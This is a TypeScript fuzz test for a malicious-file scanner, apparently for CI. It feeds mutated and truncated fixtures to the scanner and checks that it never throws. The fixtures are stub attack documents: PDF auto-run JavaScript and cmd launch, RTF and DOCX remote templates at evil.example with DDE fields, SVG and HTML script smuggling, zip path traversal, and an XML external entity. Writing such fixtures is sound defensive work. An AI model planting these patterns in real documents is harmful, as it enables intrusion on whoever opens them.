import { describe, expect, it } from "vitest";
import { scanSync } from "../src/index.js";
import { zipStored, zipEntries } from "./helpers/zip-build.js";
import { deflateRawSync, gzipSync } from "node:zlib";

const enc = (s: string) => new TextEncoder().encode(s);

function mutate(src: Uint8Array, seed: number): Uint8Array {
  const b = src.slice();
  const n = Math.max(1, Math.min(16, 1 + (seed % 8)));
  for (let k = 0; k < n; k++) {
    const i = (seed * 31 + k * 17) % b.length;
    const mode = (seed + k) % 5;
    if (mode === 0) b[i] = (b[i]! ^ (1 + (seed & 0xff))) & 0xff;
    else if (mode === 1) b[i] = 0;
    else if (mode === 2) b[i] = 0xff;
    else if (mode === 3 && i + 1 < b.length) b[i] = 0x3c; // '<'
    else b[i] = 0x25; // '%'
  }
  return b;
}

describe("mutation fuzz CI", () => {
  it("≥2k mutated inputs across formats never throw and stay in budget", () => {
    const t0 = Date.now();
    const templates: { name: string; bytes: Uint8Array }[] = [
      { name: "a.pdf", bytes: enc("%PDF-1.4\n1 0 obj<< /Type /Catalog /OpenAction << /S /JavaScript /JS (alert\\0501\\051) >> /Pages 2 0 R /AA << /O << /S /Launch /F (cmd) >> >> >>endobj\n2 0 obj<< /Type /Pages /Kids [] /Count 0 >>endobj\n3 0 obj<< /Length 4 /Filter /ASCII85Decode >>stream\nz~>\nendstream\nendobj\n4 0 obj<< /S /SubmitForm /F (http://x) >>endobj\n5 0 obj<< /S /ImportData >>endobj\n6 0 obj<< /S /GoToR /F (\\\\host\\x) >>endobj\n7 0 obj<< /Filter /JBIG2Decode /Length 1 >>stream\n!\nendstream\nendobj\ntrailer<< /Root 1 0 R >>\n%%EOF\njunk\n%%EOF\n") },
      { name: "b.pdf", bytes: enc("%PDF-1.5\n1 0 obj<< /Type /ObjStm /N 1 /First 4 /Length 30 /Filter /ASCIIHexDecode >>stream\n3220303c3c2f547970652f585e3e3e>\nendstream\nendobj\ntrailer<< /Encrypt 1 0 R /Root 1 0 R >>\n%%EOF\n") },
      { name: "a.rtf", bytes: enc("{\\rtf1\\ansi{\\object\\objupdate\\objemb{\\*\\objclass Equation.3}{\\*\\objdata \\'4d\\'5a junkjunkjunk}}{\\*\\template https://evil.example/t}{\\field{\\*\\fldinst DDEAUTO c}}}") },
      { name: "a.svg", bytes: enc('<svg xmlns="http://www.w3.org/2000/svg"><script>eval(atob("QQ=="))</script><foreignObject/><set attributeName="href" to="javascript:1"/><a href="vbscript:1"/></svg>') },
      { name: "a.html", bytes: enc('<html><script>new Blob([atob("' + "A".repeat(4200) + '")]);a.download="x"</script><iframe src="javascript:1"></iframe></html>') },
      { name: "a.zip", bytes: zipStored({ "x.txt": "hello", "../y.txt": "slip", "z.txt": "dup" }) },
      { name: "b.zip", bytes: zipEntries([{ name: "e.txt", data: enc("x"), flags: 1 }, { name: "u.bin", data: enc("y"), method: 12, crc: 0 }]) },
      { name: "a.gz", bytes: new Uint8Array(gzipSync(enc("hello world"))) },
      { name: "a.png", bytes: (() => {
        const sig = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
        const ihdr = Buffer.alloc(25);
        ihdr.writeUInt32BE(13, 0);
        ihdr.write("IHDR", 4);
        ihdr.writeUInt32BE(10, 8);
        ihdr.writeUInt32BE(10, 12);
        return Uint8Array.from([...sig, ...ihdr, 0, 0, 0, 0, 0x49, 0x45, 0x4e, 0x44, 0, 0, 0, 0]);
      })() },
      { name: "a.jpg", bytes: Uint8Array.from([0xff, 0xd8, 0xff, 0xfe, 0, 8, 0x3c, 0x68, 0x74, 0x6d, 0x6c, 0x3e, 0xff, 0xc0, 0, 0x0b, 8, 0, 1, 0, 1, 1, 1, 0x11, 0, 0xff, 0xd9, 1, 2]) },
      { name: "a.gif", bytes: enc("GIF89a\x01\x00\x01\x00\x00\x00\x00;\x00\x01\x02") },
      { name: "a.lnk", bytes: (() => {
        const h = Buffer.alloc(0x4c);
        h.writeUInt32LE(0x4c, 0);
        Buffer.from([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]).copy(h, 4);
        h.writeUInt32LE(0xa0, 0x14);
        return new Uint8Array(h);
      })() },
      { name: "a.xml", bytes: enc('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "http://evil">]><!-- c --><x>&a;</x>') },
      { name: "a.docx", bytes: zipStored({
        "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        "_rels/.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t" TargetMode="External"/></Relationships>',
        "word/document.xml": '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:fldSimple w:instr="DDE excel|a!b"/></w:body></w:document>',
      }) },
    ];

    let count = 0;
    const budgetMs = 8000;
    const start = Date.now();
    for (let seed = 0; seed < 2500 && Date.now() - start < budgetMs; seed++) {
      const t = templates[seed % templates.length]!;
      const b = seed < templates.length ? t.bytes : mutate(t.bytes, seed);
      expect(() =>
        scanSync(b, {
          filename: t.name,
          limits: { maxOperations: 2_000_000, maxBytes: 2_000_000, maxDecompressedBytes: 2_000_000 },
        }),
      ).not.toThrow();
      count++;
    }
    // also truncations
    for (const t of templates) {
      for (const n of [0, 1, 3, 7, 15, 31, 63, 127]) {
        expect(() => scanSync(t.bytes.subarray(0, Math.min(n, t.bytes.length)), { filename: t.name })).not.toThrow();
        count++;
      }
    }
    expect(count).toBeGreaterThanOrEqual(2000);
    expect(Date.now() - start).toBeLessThan(budgetMs + 2000);
  });
});
